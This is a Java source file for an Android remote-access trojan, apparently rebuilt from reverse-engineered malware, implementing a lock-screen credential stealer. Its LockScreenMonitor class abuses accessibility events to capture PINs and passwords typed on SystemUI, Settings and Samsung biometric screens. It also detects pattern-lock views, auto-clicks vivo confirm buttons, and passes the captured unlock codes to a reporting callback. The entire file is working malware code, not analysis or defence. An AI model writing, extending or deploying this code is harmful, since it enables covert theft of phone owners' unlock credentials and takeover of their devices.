package com.vendor.rat.auto.engine;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.filter.NodeFilter;
import com.vendor.rat.utils.DeviceUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;

/**
 * 锁屏密码监控引擎
 *
 * 基于逆向分析: o/h.java (196 行) + o/i.java (266 行)
 *
 * 功能:
 *   - 监听 com.android.systemui / com.android.settings 的密码输入界面
 *   - TYPE_VIEW_TEXT_CHANGED 捕获 PIN/密码输入
 *   - 图案锁监控 (lockPattern / biometric_lockPattern)
 *   - vivo PIN 确认按钮自动点击 (4种按钮ID)
 *   - OPPO 特殊图案锁 ID 适配
 *   - 密码上报回调
 *
 * 监听的界面:
 *   - com.android.systemui (锁屏界面)
 *   - com.android.settings (密码确认界面)
 *   - com.samsung.android.biometrics.app.setting (三星生物识别)
 */
public class LockScreenMonitor extends AutoEngine {

    private static final String TAG = "LockScreenMonitor";

    // 监听的包名
    private static final String SYSTEM_UI = "com.android.systemui";
    private static final String SETTINGS = "com.android.settings";
    private static final String SAMSUNG_BIOMETRICS = "com.samsung.android.biometrics.app.setting";

    // 密码确认界面类名 — 基于逆向 o/i.java
    private static final String[] CONFIRM_CLASSES = {
        "com.android.settings.password.ConfirmLockPassword",
        "com.android.settings.password.ConfirmLockPattern",
        "com.android.settings.password.ChooseLockGeneric",
        "com.vivo.settings.password.ConfirmVivoPin$InternalActivity",
        "com.android.settings.password.ConfirmLockPattern$InternalActivity"
    };

    // vivo 确认按钮 ID — 基于逆向 o/i.java J() 方法
    private static final String[] VIVO_CONFIRM_IDS = {
        ":id/mix_confirm",
        ":id/iv_complete",
        ":id/vivo_pin_confirm",
        ":id/mix_normal_confirm"
    };

    // 密码类型
    public static final String LOCK_TYPE_PIN = "PIN";
    public static final String LOCK_TYPE_PASSWORD = "PASSWORD";
    public static final String LOCK_TYPE_PATTERN = "PATTERN";

    // 捕获的密码
    private final AtomicReference<String> capturedPassword = new AtomicReference<>(null);
    private final AtomicReference<String> capturedLockType = new AtomicReference<>(null);

    // 当前监听的包名 (用于 vivo 控件 ID 拼接)
    private volatile String currentPackage = "";

    /**
     * 密码捕获回调
     */
    public interface PasswordCaptureListener {
        void onPasswordCaptured(String lockType, String lockValue);
    }

    private PasswordCaptureListener captureListener;

    public LockScreenMonitor() {
        super(buildWindowMatchers(), SYSTEM_UI);
    }

    private static List<WindowMatcher> buildWindowMatchers() {
        List<WindowMatcher> list = new ArrayList<>();

        // 1. 系统 UI — 锁屏界面
        WindowMatcher systemUi = new WindowMatcher(SYSTEM_UI);
        systemUi.addEventType(16);     // TYPE_VIEW_TEXT_CHANGED
        systemUi.addEventType(8192);   // TYPE_VIEW_TEXT_SELECTION_CHANGED
        systemUi.addEventType(32);     // TYPE_WINDOW_STATE_CHANGED
        systemUi.addEventType(16384);  // TYPE_WINDOW_CONTENT_CHANGED
        list.add(systemUi);

        // 2. 设置 — 密码确认界面
        WindowMatcher settings = new WindowMatcher(SETTINGS);
        settings.addEventType(16);
        settings.addEventType(8192);
        settings.addEventType(32);
        settings.addEventType(16384);
        list.add(settings);

        // 3. 三星生物识别设置
        WindowMatcher samsung = new WindowMatcher(SAMSUNG_BIOMETRICS);
        samsung.addEventType(16);
        samsung.addEventType(8192);
        samsung.addEventType(32);
        list.add(samsung);

        return list;
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        currentPackage = packageName;
        int eventType = event.getEventType();

        try {
            switch (eventType) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleTextChanged(event);
                    break;

                case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                    handleTextSelectionChanged(event);
                    break;

                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    handleWindowStateChanged(packageName, className);
                    break;

                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    // 图案锁内容变化
                    handleContentChanged(event);
                    break;
            }
        } catch (Exception e) {
            logError("Error monitoring lock screen", e);
        }
    }

    @Override
    public void execute() {
        // LockScreenMonitor 是被动监听，不需要主动执行
        log("Lock screen monitor started (passive)");
    }

    // ============ 事件处理 ============

    /**
     * 处理文本变化事件 — PIN/密码捕获
     * 基于逆向 o/h.java N(): 监听 EditText 的 text 属性变化
     */
    private void handleTextChanged(AccessibilityEvent event) {
        if (event.getSource() == null) return;

        UiNode source = new UiNode(event.getSource());

        // 检查是否是密码输入框
        if (source.isPassword() || isPasswordEditText(source)) {
            // 获取输入的文本
            CharSequence text = event.getText() != null && !event.getText().isEmpty()
                ? event.getText().get(0) : null;

            if (text != null && text.length() > 0) {
                String password = text.toString();
                String lockType = isNumericOnly(password) ? LOCK_TYPE_PIN : LOCK_TYPE_PASSWORD;

                capturedPassword.set(password);
                capturedLockType.set(lockType);

                log("Captured " + lockType + ": length=" + password.length());

                // vivo: 自动点击确认按钮
                if (DeviceUtils.isVivo()) {
                    autoClickVivoConfirm();
                }
            }
        }
    }

    /**
     * 处理文本选择变化 — 辅助密码捕获
     */
    private void handleTextSelectionChanged(AccessibilityEvent event) {
        // 与 handleTextChanged 类似，作为补充
        if (event.getSource() == null) return;

        UiNode source = new UiNode(event.getSource());
        if (source.isPassword()) {
            CharSequence text = event.getText() != null && !event.getText().isEmpty()
                ? event.getText().get(0) : null;

            if (text != null && text.length() > 0) {
                String password = text.toString();
                capturedPassword.set(password);
                capturedLockType.set(
                    isNumericOnly(password) ? LOCK_TYPE_PIN : LOCK_TYPE_PASSWORD);
            }
        }
    }

    /**
     * 处理窗口状态变化 — 检测密码确认界面
     * 基于逆向 o/i.java I(): 检测 ConfirmLockPassword 等界面
     */
    private void handleWindowStateChanged(String packageName, String className) {
        if (className == null) return;

        // 检查是否是密码确认界面
        if (isConfirmLockScreen(className)) {
            log("Lock screen confirm detected: " + className);

            // 如果已捕获密码，上报
            String password = capturedPassword.getAndSet(null);
            String lockType = capturedLockType.getAndSet(null);
            if (password != null && captureListener != null) {
                captureListener.onPasswordCaptured(lockType, password);
            }
        }
    }

    /**
     * 处理内容变化 — 图案锁监控
     * 基于逆向 o/h.java O()/P(): 监听 lockPattern 控件
     */
    private void handleContentChanged(AccessibilityEvent event) {
        if (event.getSource() == null) return;

        UiNode root = getRootNode();
        if (root == null) return;

        // 查找图案锁控件
        UiNode patternView = findPatternLockView(root);
        if (patternView != null) {
            log("Pattern lock view detected");
            capturedLockType.set(LOCK_TYPE_PATTERN);
            // 图案锁的具体轨迹需要通过 GESTURE_POINTS 获取
            // 这里记录检测到图案锁界面
        }
    }

    // ============ vivo 自动确认 ============

    /**
     * vivo PIN 确认按钮自动点击
     * 基于逆向 o/i.java J(): 依次尝试 4 种按钮 ID
     */
    private void autoClickVivoConfirm() {
        sleep(300);
        UiNode root = getRootNode();
        if (root == null) return;

        String pkg = currentPackage;

        for (String idSuffix : VIVO_CONFIRM_IDS) {
            String fullId = pkg + idSuffix;
            UiNode btn = root.findOneByCombine(StringCondition.viewId(fullId));
            if (btn != null) {
                btn.click();
                log("Clicked vivo confirm button: " + idSuffix);

                // 上报密码
                reportCapturedPassword();
                return;
            }
        }

        // 退而求其次: 查找文本按钮
        UiNode confirmBtn = root.findOneByCombine(
            CombineFilter.or(
                CombineFilter.button("确认"),
                CombineFilter.button("确定"),
                CombineFilter.button("继续")
            )
        );
        if (confirmBtn != null) {
            confirmBtn.click();
            log("Clicked vivo confirm button (text match)");
            reportCapturedPassword();
        }
    }

    // ============ 图案锁查找 ============

    /**
     * 查找图案锁控件
     * 基于逆向 o/h.java:
     *   - 标准: :id/lockPattern
     *   - OPPO: :id/biometric_lockPattern
     */
    private UiNode findPatternLockView(UiNode root) {
        // 标准图案锁
        UiNode pattern = root.findOneByCombine(
            StringCondition.viewIdContains("lockPattern"));
        if (pattern != null) return pattern;

        // OPPO 特殊图案锁
        if (DeviceUtils.isOppo()) {
            pattern = root.findOneByCombine(
                StringCondition.viewIdContains("biometric_lockPattern"));
            if (pattern != null) return pattern;
        }

        return null;
    }

    // ============ 工具方法 ============

    /**
     * 检查是否是密码确认界面
     * 基于逆向 o/i.java I()
     */
    private boolean isConfirmLockScreen(String className) {
        for (String cls : CONFIRM_CLASSES) {
            if (className.contains(cls) || cls.contains(className)) {
                return true;
            }
        }
        return false;
    }

    /**
     * 检查是否是密码输入框
     */
    private boolean isPasswordEditText(UiNode node) {
        String className = node.getClassName();
        return "android.widget.EditText".equals(className) && node.isPassword();
    }

    /**
     * 检查是否全是数字 (PIN)
     */
    private boolean isNumericOnly(String text) {
        for (int i = 0; i < text.length(); i++) {
            if (!Character.isDigit(text.charAt(i))) return false;
        }
        return true;
    }

    /**
     * 上报已捕获的密码
     */
    private void reportCapturedPassword() {
        String password = capturedPassword.getAndSet(null);
        String lockType = capturedLockType.getAndSet(null);
        if (password != null && captureListener != null) {
            captureListener.onPasswordCaptured(
                lockType != null ? lockType : LOCK_TYPE_PIN, password);
        }
    }

    // ============ Getters & Setters ============

    public void setCaptureListener(PasswordCaptureListener listener) {
        this.captureListener = listener;
    }

    public String getLastCapturedPassword() { return capturedPassword.get(); }
    public String getLastCapturedLockType() { return capturedLockType.get(); }
}
